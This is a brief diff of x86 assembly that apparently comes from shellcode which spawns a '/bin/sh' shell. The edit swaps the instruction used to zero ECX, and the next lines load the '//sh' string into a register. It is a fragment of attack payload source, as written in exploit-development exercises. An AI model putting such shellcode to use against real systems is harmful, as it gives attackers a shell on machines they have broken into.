@@ -4,7 +4,7 @@ global _start
 section .text
 
 _start:
-	shr ecx, 32
+	sub ecx, ecx
 	mul ecx
 	mov esi, 0x68732f2f
 	shr esi, 8
